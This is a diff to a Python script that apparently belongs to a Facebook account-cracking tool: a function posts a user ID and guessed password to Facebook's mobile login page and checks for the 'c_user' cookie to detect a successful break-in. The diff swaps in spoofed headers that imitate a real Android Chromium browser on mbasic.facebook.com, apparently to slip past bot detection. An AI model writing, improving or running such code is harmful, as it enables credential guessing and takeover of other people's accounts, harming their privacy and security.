@@ -490,27 +490,28 @@ def Asraful1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
-           'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarywrcjQPQw7AzgEykI',
-           'dpr': '1.52941',
-           'origin': 'https://m.facebook.com',
-           'referer': 'https://m.facebook.com/login/',
-           'sec-ch-prefers-color-scheme': 'light',
+           'cache-control': 'max-age=0',
+           'dpr': '1.7000000476837158',
+           'referer': 'https://mbasic.facebook.com/profile.php?eav=Afb6J67eg11QaEpne10PmralfRHG9KcC5aSHWJqILM5s_iG4Moko2aeE56KsCJH-oxQ&refid=8&paipv=0',
+           'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"RMX2189"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
-           'sec-fetch-dest': 'empty',
-           'sec-fetch-mode': 'cors',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
            'user-agent': ashahasan,
-           'viewport-width': '471',}
+           'viewport-width': '980',}
             lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
